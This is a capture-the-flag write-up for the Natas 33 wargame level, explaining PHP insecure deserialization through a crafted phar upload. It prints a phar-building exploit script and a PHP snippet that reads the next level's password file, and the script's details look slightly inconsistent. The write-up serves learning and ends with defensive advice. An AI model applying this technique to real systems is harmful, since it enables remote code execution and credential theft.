# 🧪 Natas 33

## 🎯 Objective
Obtain the password for **Natas 34**.

---

## 👀 Observation
- Website allows **file upload** functionality.
- Uploaded files are processed server-side using PHP.
- Page source reveals the use of **PHP object deserialization**.
- Uploaded data is passed into `unserialize()` after minimum validation.
- A PHP class with **magic methods** is present.

---

## 🚨 Vulnerability
**Type:**  
- PHP Object Injection / Insecure Deserialization

**Root Cause:**  
The application unserializes **user-controlled data** using `unserialize()` without proper validation or integrity checks.
The PHP class contains a magic method that performs file operations, allowing an attacker to craft a malicious object
that **executes arbitary PHP code** during deserialization.

---

## 🛠️ Exploitation Steps
1. Reviewed the page source and identified the PHP class used during deserialization.
2. Noted that the class contains a magic method (e.g., `__destruct()`).
3. Crafted a malicious serialized PHP object.
4. Set object properties to write PHP code into a file inside a web-accessible directory.
5. Uploaded the serialized payload as part of the file upload.
6. Triggered deserialization on the server.
7. Accessed the created PHP file.
8. Executed the file to read the password for **Natas 34**.

---

## 💻 Key Payload / Command
**PHP payload written to file:**
```bash
<?php
echo file_get_contents("/etc/natas_webpass/natas34");
?>
```
**PHP file:**
```<?php

class Executor{
    private $filename = "shell.php";
    private $signature = True;
    private $init = false;
}

$phar = new Phar('natas.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ? >');

$object = new Executor();
$object->data = 'rips';
$phar->setMetadata($object);
$phar->stopBuffering();

?>
```

---

## 📖 Key Takeaways
- `unserialize()` on untrusted input leads to **remote code execution**.
- Magic methods are powerful exploitation primitives.
- Object injection vulnerabilities are **logic flaws**, not syntax errors.
- Never deserialize user input without strict allow-lists or cryptographic signing.
- Secure alternatives like `json_decode()` should be preferred.
  
---

## 🖼️ Screenshots 
<img width="1116" height="765" alt="image" src="https://github.com/user-attachments/assets/313a8eff-bb53-4a84-bc75-6fcb17b1ea8d" />
<img width="1302" height="757" alt="image" src="https://github.com/user-attachments/assets/b8b0e75f-668b-4d66-bd8e-96ef8ffc5093" />
<img width="1298" height="812" alt="image" src="https://github.com/user-attachments/assets/01069711-b0e5-40d3-a7d2-34e1f023362b" />
<img width="1437" height="361" alt="image" src="https://github.com/user-attachments/assets/1ae8bb78-82e4-489b-b857-71fb15034990" /> <br>

*Password redacted for ethical reasons*
